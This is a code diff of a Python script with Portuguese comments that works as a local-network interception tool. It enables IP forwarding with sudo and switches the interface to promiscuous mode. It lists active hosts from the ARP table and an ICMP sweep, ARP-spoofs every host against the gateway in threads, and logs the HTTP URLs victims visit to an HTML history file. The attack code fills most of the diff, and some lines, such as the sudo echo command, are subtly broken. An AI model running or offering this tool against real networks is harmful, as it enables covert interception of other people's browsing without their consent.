@@ -9,13 +9,14 @@ import fcntl
 import array
 import queue
 import time
+import subprocess
 
 # Função para habilitar o encaminhamento de pacotes
 def enable_ip_forwarding():
     """
     Habilita o IP Forwarding no Linux.
     """
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    os.system("sudo bash -c echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 def get_network_info():
     """
@@ -53,6 +54,51 @@ def get_network_info():
         return interface_name, ip_address, netmask
     else:
         raise Exception("Não foi possível encontrar uma interface de rede válida.")
+    
+def discover_hosts(local_ip, active_hosts, history_file, thread_count=50):
+    """Realiza a varredura de IPs ativos na sub-rede."""
+    subnet = ".".join(local_ip.split(".")[:3])  # Determina a sub-rede (ex.: 192.168.1)
+    print(f"[*] Iniciando varredura na sub-rede: {subnet}.0/24")
+    ip_queue = Queue()
+    for i in range(1, 255):
+        ip_queue.put(f"{subnet}.{i}")
+    
+    def worker():
+        """Thread para verificar se hosts estão ativos."""
+        while not ip_queue.empty():
+            ip = ip_queue.get()
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+                sock.settimeout(1)
+                packet_id = threading.current_thread().ident & 0xFFFF
+                icmp_packet = create_icmp_packet(packet_id)
+                start_time = time.time()
+                sock.sendto(icmp_packet, (ip, 1))
+                response, _ = sock.recvfrom(1024)
+                response_time = (time.time() - start_time) * 1000  # Tempo em milissegundos
+                if parse_icmp_reply(response, packet_id):
+                    with threading.Lock():
+                        if ip not in active_hosts:
+                            active_hosts.append((ip, response_time))
+                            log_to_history(history_file, ip)
+                            print(f"[+] Host ativo: {ip} - Tempo de resposta: {response_time:.2f} ms")
+            except socket.timeout:
+                pass
+            except Exception as e:
+                print(f"[Erro] {e}")
+            finally:
+                ip_queue.task_done()
+    
+    threads = []
+    for _ in range(thread_count):
+        t = threading.Thread(target=worker)
+        t.start()
+        threads.append(t)
+    ip_queue.join()
+    for t in threads:
+        t.join()
+    print("[*] Varredura concluída.")
+    print("[*] IPs ativos encontrados:", [ip for ip, _ in active_hosts])
     
 # Função para calcular IPs dentro da sub-rede
 def calculate_subnet_hosts(ip_address, netmask):
@@ -158,8 +204,10 @@ def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
     """
     # Converter endereços MAC para bytes, se necessário
     if isinstance(target_mac, str):
+        print(f"Valor de target_mac antes da conversão: {target_mac}")
         target_mac = bytes.fromhex(target_mac.replace(":", ""))
     if isinstance(sender_mac, str):
+        print(f"Valor de target_mac antes da conversão: {sender_mac}")
         sender_mac = bytes.fromhex(sender_mac.replace(":", ""))
 
     ether_header = struct.pack("!6s6sH", target_mac, sender_mac, 0x0806)  # Ethernet II + ARP
@@ -179,24 +227,37 @@ def create_arp_packet(target_ip, target_mac, sender_ip, sender_mac):
 
 def get_mac(ip, interface):
     """
-    Realiza uma resolução ARP para obter o MAC associado a um IP.
+    Obtém o MAC address associado a um IP usando a tabela ARP do sistema.
     """
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-    sock.bind((interface, 0))
-    for _ in range(5):  # Tenta algumas vezes para garantir
-        packet = create_arp_packet(ip, "ff:ff:ff:ff:ff:ff", "0.0.0.0", "00:00:00:00:00:00")
-        sock.send(packet)
-        response = sock.recv(65535)
-        if response[12:14] == b"\x08\x06":  # Verifica se é ARP
-            sender_ip = socket.inet_ntoa(response[28:32])
-            if sender_ip == ip:
-                mac = response[22:28]  # Já retorna em bytes
-                break
-    else:
-        raise Exception(f"MAC não encontrado para o IP {ip}")
-    sock.close()
-    return mac
+    try:
+        result = subprocess.check_output(["arp", "-n", ip], text=True)
+        mac = result.splitlines()[-1].split()[2]
+        if mac and mac != "(incomplete)":
+            # Verifica o formato do MAC
+            if not all(c in "0123456789abcdefABCDEF:" for c in mac):
+                raise ValueError(f"MAC inválido: {mac}")
+            return mac
+    except Exception as e:
+        print(f"Erro ao obter o MAC do IP {ip}: {e}")
+    raise Exception(f"MAC não encontrado para o IP {ip}")
 
+def get_active_macs(interface):
+    """
+    Obtém uma lista de IPs e MACs ativos na rede usando a tabela ARP.
+    """
+    try:
+        result = subprocess.check_output(["arp", "-n"], text=True).splitlines()
+        active_hosts = {}
+        for line in result[1:]:  # Ignora a primeira linha (cabeçalhos)
+            parts = line.split()
+            if len(parts) >= 4 and parts[2] != "(incomplete)":
+                ip = parts[0]
+                mac = parts[2]
+                active_hosts[ip] = mac
+        return active_hosts
+    except Exception as e:
+        print(f"[Erro] Falha ao obter dispositivos ativos: {e}")
+        return {}
 
 # Função para enviar ARP Spoofing
 def arp_spoof(target_ip, gateway_ip, interface):
@@ -237,13 +298,24 @@ def set_promiscuous_mode(interface, enable=True):
     # Aplicar as alterações
     ifr = struct.pack('16sH', interface.encode('utf-8'), flags)
     fcntl.ioctl(sock, 0x8914, ifr)  # SIOCSIFFLAGS
+
+    # Verificar se a operação foi bem-sucedida
+    new_flags = struct.unpack('16sH', fcntl.ioctl(sock, 0x8913, ifr))[1]
+    if enable and (new_flags & 0x100):
+        print(f"[+] Modo promíscuo ativado com sucesso na interface {interface}")
+    elif not enable and not (new_flags & 0x100):
+        print(f"[+] Modo promíscuo desativado com sucesso na interface {interface}")
+    else:
+        print(f"[!] Falha ao alterar o modo promíscuo na interface {interface}")
+
     sock.close()
 
 
+
 # Função para capturar tráfego
-def capture_traffic(interface, output_file):
+def capture_traffic(interface, output_file, valid_macs):
     """
-    Captura pacotes HTTP e HTTPS e salva em um relatório HTML.
+    Captura pacotes HTTP e HTTPS apenas de dispositivos com MACs válidos usando a tabela ARP.
     """
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
     sock.bind((interface, 0))  # Vincula o socket à interface fornecida
@@ -252,45 +324,64 @@ def capture_traffic(interface, output_file):
         try:
             while True:
                 packet = sock.recv(65535)
-                eth_proto = struct.unpack("!H", packet[12:14])[0]
+                eth_header = packet[:14]
 
-                if eth_proto == 0x0800:  # IPv4
-                    ip_header = packet[14:34]
-                    ip_proto = struct.unpack("!B", ip_header[9:10])[0]
-                    src_ip = socket.inet_ntoa(ip_header[12:16])
-                    dest_ip = socket.inet_ntoa(ip_header[16:20])
+                # Identificar o protocolo Ethernet
+                eth_proto = struct.unpack("!H", eth_header[12:14])[0]
 
-                    if ip_proto == 6:  # TCP
-                        tcp_header = packet[34:54]
-                        src_port, dest_port = struct.unpack("!HH", tcp_header[0:4])
-                        data_offset = (struct.unpack("!B", tcp_header[12:13])[0] >> 4) * 4
-                        payload_offset = 14 + 20 + data_offset  # Ethernet + IP + TCP
-                        payload = packet[payload_offset:]
+                # Continuar apenas se for IPv4
+                if eth_proto != 0x0800:  # IPv4
+                    continue
 
-                        if dest_port == 80:  # HTTP
-                            try:
-                                http_data = payload.decode(errors='ignore')
-                                timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+                # Extrair cabeçalho IP
+                ip_header = packet[14:34]
+                ip_proto = struct.unpack("!B", ip_header[9:10])[0]
+                src_ip = socket.inet_ntoa(ip_header[12:16])
+                dest_ip = socket.inet_ntoa(ip_header[16:20])
 
-                                # Extraindo URL do tráfego HTTP
-                                headers = http_data.split("\r\n")
-                                host = ""
-                                path = ""
-                                for header in headers:
-                                    if header.lower().startswith("host:"):
-                                        host = header.split(": ")[1]
-                                    if header.startswith("GET") or header.startswith("POST"):
-                                        path = header.split(" ")[1]
-                                if host:
-                                    url = f"http://{host}{path}" if path else f"http://{host}/"
-                                    f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
-                                    print(f"[+] HTTP URL Capturada: {url}")
-                                f.flush()
-                            except Exception as e:
-                                print(f"[Erro] Não foi possível processar o pacote HTTP: {e}")
+                # Usar a tabela ARP para obter o MAC associado ao src_ip
+                src_mac = valid_macs.get(src_ip)
+                if not src_mac:
+                    # Se não estiver na tabela ARP, ignorar
+                    continue
+
+                # Verificar se o MAC está na lista de válidos
+                if src_mac not in valid_macs.values():
+                    continue
+
+                if ip_proto == 6:  # TCP
+                    tcp_header = packet[34:54]
+                    src_port, dest_port = struct.unpack("!HH", tcp_header[0:4])
+                    data_offset = (struct.unpack("!B", tcp_header[12:13])[0] >> 4) * 4
+                    payload_offset = 14 + 20 + data_offset  # Ethernet + IP + TCP
+                    payload = packet[payload_offset:]
+
+                    if dest_port == 80:  # HTTP
+                        try:
+                            http_data = payload.decode(errors='ignore')
+                            timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+                            # Extraindo URL do tráfego HTTP
+                            headers = http_data.split("\r\n")
+                            host = ""
+                            path = ""
+                            for header in headers:
+                                if header.lower().startswith("host:"):
+                                    host = header.split(": ")[1]
+                                if header.startswith("GET") or header.startswith("POST"):
+                                    path = header.split(" ")[1]
+                            if host:
+                                url = f"http://{host}{path}" if path else f"http://{host}/"
+                                f.write(f"<li>{timestamp} - {src_ip} -> {dest_ip}:{dest_port} - <a href=\"{url}\">{url}</a></li>\n")
+                                print(f"[+] HTTP URL Capturada: {url}")
+                            f.flush()
+                        except Exception as e:
+                            print(f"[Erro] Não foi possível processar o pacote HTTP: {e}")
         except KeyboardInterrupt:
             print("\n[INFO] Captura interrompida pelo usuário.")
         f.write("</ul></body></html>\n")
+
+
 
 def extract_sni(tls_data):
     """
@@ -348,66 +439,44 @@ def main():
         print(f"    - Endereço IP: {ip_address}")
         print(f"    - Máscara de sub-rede: {netmask}")
 
+        # Ativar modo promíscuo
+        set_promiscuous_mode(interface, enable=True)
+
         # Obter o gateway padrão
         gateway_ip = get_default_gateway()
         if not gateway_ip:
             raise Exception("Não foi possível encontrar o gateway padrão.")
         print(f"    - Gateway padrão: {gateway_ip}")
 
-        # Calcular os endereços IP na sub-rede
-        print("[*] Calculando os endereços IP na sub-rede...")
-        subnet_hosts = calculate_subnet_hosts(ip_address, netmask)
-        print(f"    - Total de hosts na sub-rede: {len(subnet_hosts)}")
-
         # Habilitar IP Forwarding
         print("[*] Habilitando IP Forwarding...")
         enable_ip_forwarding()
 
-        # Ativar modo promíscuo
-        set_promiscuous_mode(interface, enable=True)
+        # Obter dispositivos ativos
+        print("[*] Obtendo dispositivos ativos na rede...")
+        active_hosts = get_active_macs(interface)
+        print(f"    - Dispositivos ativos encontrados:")
+        for ip, mac in active_hosts.items():
+            print(f"      * {ip} -> {mac}")
 
-        # Varredura de IPs ativos
-        print("[*] Iniciando varredura de IPs ativos...")
-        ip_queue = queue.Queue()
-        active_hosts = []
-        lock = threading.Lock()
-
-        # Adicionar IPs à fila de varredura
-        for ip in subnet_hosts:
-            ip_queue.put(ip)
-
-        # Iniciar threads para varredura
-        threads = []
-        for _ in range(50):  # Número de threads
-            t = threading.Thread(target=ping_worker, args=(ip_queue, active_hosts, lock))
-            t.start()
-            threads.append(t)
-
-        # Aguarda a conclusão da varredura
-        ip_queue.join()
-        for t in threads:
-            t.join()
-
-        # Exibir resultados da varredura
-        print("\n[+] Varredura concluída!")
-        print(f"    - Total de hosts ativos: {len(active_hosts)}")
-        for host, response_time in active_hosts:
-            print(f"      * {host} - Tempo de resposta: {response_time:.2f} ms")
+        # Verificar se há hosts ativos antes de continuar
+        if not active_hosts:
+            print("[!] Nenhum dispositivo ativo encontrado. Finalizando a aplicação.")
+            return
 
         # Iniciar ARP Spoofing (caso existam hosts ativos)
-        if active_hosts:
-            print("[*] Iniciando ARP Spoofing...")
-            spoof_threads = []
-            for ip, _ in active_hosts:
-                t = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, interface))
-                spoof_threads.append(t)
-                t.start()
-            print("[*] ARP Spoofing iniciado com sucesso!")
+        print("[*] Iniciando ARP Spoofing...")
+        spoof_threads = []
+        for ip in active_hosts.keys():
+            t = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, interface))
+            spoof_threads.append(t)
+            t.start()
+        print("[*] ARP Spoofing iniciado com sucesso!")
 
         # Captura de tráfego
         print("[*] Capturando tráfego de rede...")
         capture_file = "historico.html"
-        capture_traffic(interface, capture_file)
+        capture_traffic(interface, capture_file, active_hosts)  # Passando os MACs válidos
         print(f"[+] Captura de tráfego salva em: {capture_file}")
 
     except KeyboardInterrupt:
@@ -418,6 +487,7 @@ def main():
         # Desativar modo promíscuo ao final da execução
         set_promiscuous_mode(interface, enable=False)
         print("[*] Finalizando a aplicação...")
+
 
 
 
